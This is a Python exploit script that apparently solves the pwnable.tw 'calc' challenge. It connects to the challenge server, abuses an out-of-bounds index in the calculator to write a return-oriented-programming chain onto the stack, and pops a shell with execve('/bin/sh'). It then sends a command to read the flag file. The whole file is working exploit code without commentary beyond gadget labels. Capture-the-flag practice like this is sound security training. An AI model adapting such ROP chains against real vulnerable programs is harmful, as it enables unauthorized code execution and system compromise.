import socket

# return to main idx: 368
def calc(idx,address):
    p = f"+{idx}+{address}\n"
    print(p,end="")
    s.send(p.encode())
    s.recv(256)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10100))
print(s.recv(1024))

# bss section: 0x80eb060
payload = []
# save '/bin/sh' in .bss section
payload.append(0x080701aa)   # pop edx ; ret
payload.append(0x80eb060)    # destiny
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x6e69622f)     # '/bin'
payload.append(0x0809b30d)   # mov dword ptr [edx], eax ; ret
payload.append(0x080701aa)   # pop edx ; ret
payload.append(0x80eb060+4)  # destiny
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x68732f)     # '/sh'
payload.append(0x0809b30d)   # mov dword ptr [edx], eax ; ret

# execve('/bin/sh\x00',NULL,NULL)
payload.append(0x080701d1)   # pop ecx ; pop ebx ; ret
payload.append(1)            # ecx + 1
payload.append(0x80eb060)    # ebx
payload.append(0x0806f4eb)   # dec ecx ; ret
payload.append(0x080701aa)   # pop edx ; ret
payload.append(1)            # edx + 1
payload.append(0x080e72e3)   # dec edx ; ret
payload.append(0x0805c34b)   # pop eax ; ret
payload.append(0x0b)         # __NR_execve
payload.append(0x08049a21)   # int 0x80
payload.reverse()
num = len(payload) - 1
for i,address in enumerate(payload):
    calc(368 + num - i,address)
s.send(b"\ncat /home/calc/flag\n")
print(s.recv(1024).decode())
